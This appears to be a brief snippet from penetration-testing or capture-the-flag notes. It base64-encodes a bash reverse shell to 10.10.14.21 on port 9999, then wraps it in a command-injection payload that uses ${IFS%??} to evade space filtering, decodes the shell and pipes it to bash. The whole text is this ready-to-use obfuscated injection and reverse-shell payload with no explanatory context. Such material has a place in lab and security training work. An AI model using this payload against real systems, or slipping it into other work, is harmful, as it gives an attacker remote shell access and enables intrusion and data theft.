```bash
echo "bash -i >& /dev/tcp/10.10.14.21/9999 0>&1" | base64 -w 0    

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMS85OTk5IDA+JjEK
```

```
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMS85OTk5IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```